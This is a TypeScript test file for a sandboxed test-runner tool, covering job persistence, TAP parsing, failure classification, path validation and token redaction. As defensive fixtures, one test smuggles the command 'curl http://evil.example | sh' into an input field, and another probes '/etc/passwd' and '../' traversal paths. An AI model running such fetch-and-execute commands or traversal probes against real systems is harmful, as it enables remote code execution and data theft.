// TEST-01-W1: hermetic infrastructure tests (T1-T18) for the real test execution
// capability. Docker-safe by construction: no test here may reach the real release
// runner socket (the suite/full runner path is exercised in tools.integration.test.ts
// behind an existsSync gate), no caller-supplied command strings exist anywhere, and
// every job store used here is a fresh per-process directory OUTSIDE the authorized
// tree (verification baselines walk the worktree - an in-tree store would self-trip
// UNEXPECTED_VERIFICATION_MUTATION).
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdir, mkdtemp, readdir, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";
import { RepositoryAdapter } from "../src/repository.ts";
import { EngineeringError, RepositoryPolicy } from "../src/policy.ts";
import {
  classifyInfraError,
  classifySyncRunOutcome,
  createSuiteJob,
  createTestExecutionId,
  finishSuiteJobFromRunner,
  finishSuiteJobInfra,
  getTestJobStore,
  parseTapFailures,
  parseTapSummary,
  reconcileSuiteJob,
  TestJobStore,
  type TestJob
} from "../src/testJobs.ts";

// The store singleton is created lazily on the first testRun/testStatus call, so a
// fresh per-process directory set here - before any such call - keeps all readback
// in this file hermetic (npm test runs every file in its own child process).
process.env.ENG_MCP_TEST_JOBS_DIR = await mkdtemp(path.join(tmpdir(), "test01-jobs-"));
const store = getTestJobStore();

const PASSING_TEST = [
  "import test from \"node:test\";",
  "import assert from \"node:assert/strict\";",
  "test(\"fixture passes\", () => { assert.equal(1 + 1, 2); });",
  ""
].join("\n");
const PASSING_TEST_B = [
  "import test from \"node:test\";",
  "import assert from \"node:assert/strict\";",
  "test(\"fixture passes too\", () => { assert.equal(2 + 2, 4); });",
  ""
].join("\n");
const MULTI_FAIL_TEST = [
  "import test from \"node:test\";",
  "import assert from \"node:assert/strict\";",
  "test(\"first failure\", () => { assert.equal(1, 2); });",
  "test(\"second failure\", () => { assert.deepEqual({ a: 1 }, { a: 2 }); });",
  "test(\"third failure\", () => { assert.ok(false, \"boom\"); });",
  ""
].join("\n");
const MUTATOR_TEST = [
  "import test from \"node:test\";",
  "import { writeFileSync } from \"node:fs\";",
  "test(\"fixture mutates the worktree\", () => { writeFileSync(\"mutated-by-child.txt\", \"mutation\\n\"); });",
  ""
].join("\n");

async function fixture(): Promise<string> {
  const root = path.join(tmpdir(), `test01-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  await mkdir(path.join(root, "test"), { recursive: true });
  await mkdir(path.join(root, "src"), { recursive: true });
  await mkdir(path.join(root, "node_modules", "tsx"), { recursive: true });
  // Hermetic tsx shim: the fixed `node --import tsx --test` matrix must resolve the
  // specifier from the fixture itself (plain node:test needs no transpilation).
  await writeFile(path.join(root, "node_modules", "tsx", "package.json"), JSON.stringify({ name: "tsx", version: "0.0.0-fixture", type: "module", main: "index.mjs" }));
  await writeFile(path.join(root, "node_modules", "tsx", "index.mjs"), "export {};\n");
  await writeFile(path.join(root, "src", "app.ts"), "export const app = true;\n");
  await writeFile(path.join(root, "notes.xyz"), "not a readable type\n");
  execFileSync("git", ["init"], { cwd: root });
  execFileSync("git", ["config", "user.email", "test@example.com"], { cwd: root });
  execFileSync("git", ["config", "user.name", "Test"], { cwd: root });
  execFileSync("git", ["config", "commit.gpgsign", "false"], { cwd: root });
  return root;
}

async function adapterFor(root: string): Promise<RepositoryAdapter> {
  return new RepositoryAdapter(await RepositoryPolicy.create(root));
}

function makeJob(overrides: Partial<TestJob> = {}): TestJob {
  const executionId = overrides.executionId ?? createTestExecutionId("file");
  const now = new Date().toISOString();
  return {
    version: 1,
    executionId,
    profile: "file",
    executor: "sync",
    status: "RUNNING",
    selection: ["test/passing.test.mjs"],
    createdAt: now,
    startedAt: now,
    timeoutMs: 60_000,
    evidenceId: `test-job:${executionId}`,
    ...overrides
  };
}

test("T1+T3+T7 file profile runs a real passing test and readback returns the persisted verdict", async () => {
  const root = await fixture();
  await writeFile(path.join(root, "test", "passing.test.mjs"), PASSING_TEST);
  const repo = await adapterFor(root);
  const view = await repo.testRun("test01", { mode: "file", path: "test/passing.test.mjs" });
  // T1: the stub returned "Placeholder implementation" and a node --version probe; a
  // real execution carries a TAP-parsed verdict and the persisted job shape instead.
  assert.equal(view.status, "PASS");
  assert.equal(view.executor, "sync");
  assert.equal(view.profile, "file");
  assert.match(view.executionId, /^[A-Za-z0-9][A-Za-z0-9._-]{7,127}$/);
  assert.equal(view.evidenceId.startsWith("test-job:"), true);
  assert.equal(view.testsExecuted, 1);
  assert.equal(view.passed, 1);
  assert.equal(view.failed, 0);
  assert.equal(view.skipped, 0);
  assert.equal(view.exitCode, 0);
  assert.equal(view.timedOut, false);
  assert.equal(typeof view.wallTimeMs, "number");
  assert.equal(view.outputLocation !== null, true); // full log on disk, not in the response
  assert.match(String(view.outputLocation ?? ""), new RegExp(`${view.executionId}\\.log$`));
  // T7: testStatus reads the persisted job, not fresh state.
  const again = await repo.testStatus({ executionId: view.executionId });
  assert.equal(again.status, "PASS");
  assert.equal(again.passed, 1);
});

test("T2 related profile executes an explicit selection of real files", async () => {
  const root = await fixture();
  await writeFile(path.join(root, "test", "passing.test.mjs"), PASSING_TEST);
  await writeFile(path.join(root, "test", "passing-b.test.mjs"), PASSING_TEST_B);
  const repo = await adapterFor(root);
  const view = await repo.testRun("test01", { mode: "related", paths: ["test/passing.test.mjs", "test/passing-b.test.mjs"] });
  assert.equal(view.status, "PASS");
  assert.equal(view.profile, "related");
  assert.equal(view.selection.length, 2);
  assert.equal(view.testsExecuted, 2);
  // W1 structured refusals only: no invented selection heuristics.
  await assert.rejects(repo.testRun("test01", { mode: "related" }), (error: unknown) => error instanceof EngineeringError && error.code === "RELATED_SELECTION_REQUIRED");
  await assert.rejects(repo.testRun("test01", { mode: "related", paths: ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"] }), (error: unknown) => error instanceof EngineeringError && error.code === "TEST_SELECTION_TOO_LARGE");
  await assert.rejects(repo.testRun("test01", { mode: "file" }), (error: unknown) => error instanceof EngineeringError && error.code === "PATH_REQUIRED");
});

test("T4+T7 file profile classifies assertion failures with bounded summaries", async () => {
  const root = await fixture();
  await writeFile(path.join(root, "test", "failing.test.mjs"), MULTI_FAIL_TEST);
  const repo = await adapterFor(root);
  const view = await repo.testRun("test01", { mode: "file", path: "test/failing.test.mjs" });
  assert.equal(view.status, "FAIL");
  assert.equal(view.failureClass, "ASSERTION_FAILURE");
  assert.equal(view.failed, 3);
  assert.equal(view.passed, 0);
  assert.equal(view.testsExecuted, 3);
  assert.equal(view.exitCode, 1);
  assert.ok(Array.isArray(view.failureSummaries));
  assert.equal(view.failureSummaries.length, 3);
  for (const summary of view.failureSummaries) {
    assert.ok(summary.name.length <= 200);
    if (summary.message !== undefined) assert.ok(summary.message.length <= 300);
  }
  assert.match(view.failureSummaries[0].name, /first failure/);
  const again = await repo.testStatus({ executionId: view.executionId });
  assert.equal(again.status, "FAIL");
  assert.equal(again.failureClass, "ASSERTION_FAILURE");
});

test("T5 createSuiteJob persists a RUNNING async job with a unique execution id", async () => {
  const jobStore = new TestJobStore(await mkdtemp(path.join(tmpdir(), "test01-t5-")));
  const job = await createSuiteJob(jobStore, "suite");
  assert.equal(job.status, "RUNNING");
  assert.equal(job.executor, "release-runner");
  assert.match(job.executionId, /^[A-Za-z0-9][A-Za-z0-9._-]{7,127}$/);
  const loaded = await jobStore.load(job.executionId);
  assert.equal(loaded.status, "RUNNING");
  assert.equal(loaded.profile, "suite");
});

test("T6 status RUNNING is never an error", async () => {
  const job = makeJob();
  await store.save(job);
  const repo = await adapterFor(await fixture());
  const view = await repo.testStatus({ executionId: job.executionId });
  assert.equal(view.status, "RUNNING");
});

test("T8 unknown execution id raises the typed TEST_JOB_NOT_FOUND", async () => {
  const repo = await adapterFor(await fixture());
  await assert.rejects(repo.testStatus({ executionId: "no-such-job-0001" }), (error: unknown) => error instanceof EngineeringError && error.code === "TEST_JOB_NOT_FOUND");
});

test("T9 job store persists and reloads across store instances", async () => {
  const jobsDir = await mkdtemp(path.join(tmpdir(), "test01-t9-"));
  const job = makeJob({ selection: ["test/a.test.mjs", "test/b.test.mjs"] });
  await new TestJobStore(jobsDir).save(job);
  const loaded = await new TestJobStore(jobsDir).load(job.executionId);
  assert.equal(loaded.executionId, job.executionId);
  assert.equal(loaded.status, "RUNNING");
  assert.deepEqual(loaded.selection, job.selection);
});

test("T10 persistence is atomic: no temp residue and stable under concurrent saves", async () => {
  const jobStore = new TestJobStore(await mkdtemp(path.join(tmpdir(), "test01-t10-")));
  const job = makeJob();
  await jobStore.save(job);
  assert.deepEqual(await jobStore.listTempResidue(), []);
  await Promise.all(Array.from({ length: 10 }, (_, index) => jobStore.save({ ...job, status: index % 2 === 0 ? "RUNNING" : "PASS" })));
  const loaded = await jobStore.load(job.executionId);
  assert.equal(loaded.version, 1);
  assert.equal(loaded.executionId, job.executionId);
  assert.ok(["RUNNING", "PASS"].includes(loaded.status));
  assert.deepEqual(await jobStore.listTempResidue(), []);
});

test("T11 reconcileSuiteJob reconciles only from strictly-newer persisted evidence", async () => {
  const jobStore = new TestJobStore(await mkdtemp(path.join(tmpdir(), "test01-t11-")));
  const job = await createSuiteJob(jobStore, "full");
  const future = new Date(Date.now() + 5_000).toISOString();
  const past = new Date(Date.now() - 60_000).toISOString();
  const good = { testedAt: future, testStatus: "PASS", tests: 10, passed: 10, failed: 0 };
  const reconciled = reconcileSuiteJob(job, good);
  assert.ok(reconciled);
  assert.equal(reconciled.status, "PASS");
  assert.equal(reconciled.testsExecuted, 10);
  assert.equal(reconciled.failed, 0);
  // stale evidence (a suite finished before this job started) must never reconcile
  assert.equal(reconcileSuiteJob(job, { ...good, testedAt: past }), null);
  // only a real verdict reconciles
  assert.equal(reconcileSuiteJob(job, { ...good, testStatus: "PENDING" }), null);
  // terminal jobs are immutable via reconcile
  assert.equal(reconcileSuiteJob(reconciled, good), null);
});

test("T12 reconnect readback reconciles a RUNNING suite job from the persisted release-state.json", async () => {
  const releaseStatePath = fileURLToPath(new URL("../release-state.json", import.meta.url));
  if (!existsSync(releaseStatePath)) return; // honest skip where no release state exists
  const releaseState = JSON.parse(await readFile(releaseStatePath, "utf8")) as Record<string, unknown>;
  const testedAtMs = Date.parse(typeof releaseState.testedAt === "string" ? releaseState.testedAt : "");
  if (!Number.isFinite(testedAtMs)) return;
  const executionId = createTestExecutionId("suite");
  const startedAt = new Date(testedAtMs - 60_000).toISOString();
  const job: TestJob = { version: 1, executionId, profile: "suite", executor: "release-runner", status: "RUNNING", selection: [], createdAt: startedAt, startedAt, evidenceId: `test-job:${executionId}` };
  await store.save(job);
  const repo = await adapterFor(await fixture());
  const view = await repo.testStatus({ executionId: job.executionId });
  // The job was RUNNING against a suite result the runner already persisted - the
  // readback must converge on the persisted verdict and its persisted counters.
  assert.equal(view.status, releaseState.testStatus);
  assert.equal(view.testsExecuted, typeof releaseState.tests === "number" ? releaseState.tests : null);
  assert.equal(view.passed, typeof releaseState.passed === "number" ? releaseState.passed : null);
  assert.equal(view.failed, typeof releaseState.failed === "number" ? releaseState.failed : null);
  assert.ok(Array.isArray(view.failureSummaries));
});

test("T12 finishSuiteJob* completes async jobs with no live client", async () => {
  const jobStore = new TestJobStore(await mkdtemp(path.join(tmpdir(), "test01-t12-")));
  const passJob = await createSuiteJob(jobStore, "suite");
  const passed = await finishSuiteJobFromRunner(jobStore, passJob.executionId, { status: "PASS", tests: 5, passed: 5, failed: 0 });
  assert.equal(passed.status, "PASS");
  assert.equal(passed.testsExecuted, 5);
  assert.equal(passed.wallTimeMs !== null, true);
  const failJob = await createSuiteJob(jobStore, "suite");
  const failed = await finishSuiteJobFromRunner(jobStore, failJob.executionId, { status: "FAIL", tests: 4, passed: 2, failed: 2, failures: [{ test: "case one", message: "expected 1 got 2" }, { message: "unnamable" }] });
  assert.equal(failed.status, "FAIL");
  assert.equal(failed.failureClass, "ASSERTION_FAILURE");
  assert.equal(failed.failed, 2);
  assert.equal(failed.failureSummaries.length, 2);
  assert.equal(failed.failureSummaries[0].name, "case one");
  assert.equal(failed.failureSummaries[1].name, "[UNKNOWN]");
  const infraJob = await createSuiteJob(jobStore, "full");
  const infra = await finishSuiteJobInfra(jobStore, infraJob.executionId, "RELEASE_CONFLICT: release pipeline busy");
  assert.equal(infra.status, "INFRA_ERROR");
  assert.equal(infra.failureClass, "RUNNER_ERROR");
  assert.equal(infra.failed, undefined); // INFRA never increments failed counters
  assert.ok(infra.infraFailures.length >= 1);
  // idempotent: a terminal job is never re-finished
  const repeat = await finishSuiteJobInfra(jobStore, infraJob.executionId, "second attempt");
  assert.equal(repeat.status, "INFRA_ERROR");
  assert.equal(repeat.infraFailures.length, 1);
});

test("T13+T17 an in-run worktree mutation is infrastructure (RUNNER_ERROR), never a test verdict", async () => {
  const root = await fixture();
  await writeFile(path.join(root, "test", "mutator.test.mjs"), MUTATOR_TEST);
  const repo = await adapterFor(root);
  const before = new Set(await readdir(store.jobsRoot));
  await assert.rejects(
    repo.testRun("test01", { mode: "file", path: "test/mutator.test.mjs" }),
    (error: unknown) => error instanceof EngineeringError && error.code === "UNEXPECTED_VERIFICATION_MUTATION"
  );
  const fresh = (await readdir(store.jobsRoot)).filter((name) => name.endsWith(".json") && !before.has(name));
  assert.equal(fresh.length, 1);
  const job = JSON.parse(await readFile(path.join(store.jobsRoot, fresh[0]), "utf8"));
  assert.equal(job.status, "INFRA_ERROR");
  assert.equal(job.failureClass, "RUNNER_ERROR");
  assert.equal(job.failed, undefined); // T13 invariant: infra failure never increments TESTS_FAILED
  assert.ok(Array.isArray(job.infraFailures) && job.infraFailures.length >= 1);
});

test("T14 failure summaries are bounded and never leak sensitive content", async () => {
  const lines: string[] = ["TAP version 13", "1..30", "# tests 30", "# pass 0", "# fail 30"];
  const sensitive = "ghp_" + "A".repeat(30);
  lines.push("not ok 1 - bounded case one");
  lines.push("  ---");
  lines.push(`    error: 'token ${sensitive}'`);
  lines.push("  ...");
  for (let index = 2; index <= 30; index++) {
    lines.push(`not ok ${index} - bounded case ${index}`);
    lines.push("  ---");
    lines.push(`    error: 'assertion ${index} failed'`);
    lines.push("  ...");
  }
  const failures = parseTapFailures(lines.join("\n"));
  assert.equal(failures.length, 20);
  for (const summary of failures) {
    assert.ok(summary.name.length <= 200);
    if (summary.message !== undefined) assert.ok(summary.message.length <= 300);
  }
  // The sensitive message inside the bounded window is dropped, not emitted.
  assert.equal(JSON.stringify(failures).includes(sensitive), false);
  assert.equal(JSON.stringify(failures).includes("ghp_"), false);
  // counters are never invented when there is no TAP summary
  assert.equal(parseTapSummary("no tap here"), null);
  assert.deepEqual(parseTapSummary("# tests 4\n# pass 3\n# fail 1"), { tests: 4, passed: 3, failed: 1, skipped: 0, cancelled: 0 });
});

test("T15 path validation blocks escapes, absolute paths and non-test targets", async () => {
  const repo = await adapterFor(await fixture());
  await assert.rejects(repo.testRun("test01", { mode: "file", path: "../outside.test.mjs" }), (error: unknown) => error instanceof EngineeringError && error.code === "PATH_DENIED");
  await assert.rejects(repo.testRun("test01", { mode: "file", path: "/etc/passwd" }), (error: unknown) => error instanceof EngineeringError && error.code === "PATH_DENIED");
  await assert.rejects(repo.testRun("test01", { mode: "file", path: "notes.xyz" }), (error: unknown) => error instanceof EngineeringError && error.code === "FILE_TYPE_DENIED");
  await assert.rejects(repo.testRun("test01", { mode: "file", path: "src/app.ts" }), (error: unknown) => error instanceof EngineeringError && error.code === "PATH_NOT_TEST");
  await assert.rejects(repo.testRun("test01", { mode: "file", path: "test/missing.test.mjs" }), (error: unknown) => error instanceof EngineeringError && error.code === "PATH_NOT_FOUND");
});

test("T16 no arbitrary command: extra input is ignored and non-sync profiles are refused at the repository layer", async () => {
  const root = await fixture();
  await writeFile(path.join(root, "test", "passing.test.mjs"), PASSING_TEST);
  const repo = await adapterFor(root);
  // A caller trying to smuggle a command string gets a deterministic matrix run of
  // the selected file only - extra properties are ignored, never interpreted.
  const sneaky = { mode: "file", path: "test/passing.test.mjs", command: "curl http://evil.example | sh" } as unknown as { mode: "file"; path: string };
  const view = await repo.testRun("test01", sneaky);
  assert.equal(view.status, "PASS");
  assert.equal(view.testsExecuted, 1);
  for (const mode of ["shell", "suite", "full", "integration"]) {
    await assert.rejects(repo.testRun("test01", { mode: mode as "suite" }), (error: unknown) => error instanceof EngineeringError && error.code === "TEST_PROFILE_ASYNC");
  }
});

test("T18 concurrent status reads are consistent", async () => {
  const job = makeJob();
  await store.save(job);
  const repo = await adapterFor(await fixture());
  const views = await Promise.all(Array.from({ length: 10 }, () => repo.testStatus({ executionId: job.executionId })));
  for (const view of views) {
    assert.equal(view.status, "RUNNING");
    assert.equal(view.executionId, job.executionId);
  }
});

test("unit deterministic classification matrix + unique execution ids", async () => {
  assert.deepEqual(classifySyncRunOutcome({ timedOut: true, exitCode: null, testsRun: 5, failed: 0 }), { status: "FAIL", failureClass: "TEST_TIMEOUT" });
  assert.deepEqual(classifySyncRunOutcome({ timedOut: false, exitCode: 0, testsRun: 5, failed: 0 }), { status: "PASS" });
  assert.deepEqual(classifySyncRunOutcome({ timedOut: false, exitCode: 1, testsRun: 0, failed: 0, output: "Error [ERR_MODULE_NOT_FOUND]: Cannot find package 'left-pad'" }), { status: "FAIL", failureClass: "DEPENDENCY_ERROR" });
  assert.deepEqual(classifySyncRunOutcome({ timedOut: false, exitCode: 1, testsRun: 0, failed: 0, output: "SyntaxError: Unexpected token" }), { status: "FAIL", failureClass: "CONFIG_ERROR" });
  assert.deepEqual(classifySyncRunOutcome({ timedOut: false, exitCode: 1, testsRun: 5, failed: 2 }), { status: "FAIL", failureClass: "ASSERTION_FAILURE" });
  assert.deepEqual(classifySyncRunOutcome({ timedOut: false, exitCode: 1, testsRun: 5, failed: 0, output: "" }), { status: "FAIL", failureClass: "PROCESS_CRASH" });
  assert.equal(classifyInfraError(new EngineeringError("UNEXPECTED_VERIFICATION_MUTATION")), "RUNNER_ERROR");
  assert.equal(classifyInfraError(new EngineeringError("BASELINE_LIMIT_EXCEEDED")), "RUNNER_ERROR");
  assert.equal(classifyInfraError(new EngineeringError("DEPENDENCY_UNAVAILABLE")), "DEPENDENCY_ERROR");
  assert.equal(classifyInfraError(new Error("connect ECONNREFUSED 127.0.0.1:65535")), "INFRASTRUCTURE_ERROR");
  const ids = new Set(Array.from({ length: 50 }, () => createTestExecutionId("suite")));
  assert.equal(ids.size, 50);
  for (const id of ids) assert.match(id, /^[A-Za-z0-9][A-Za-z0-9._-]{7,127}$/);
});
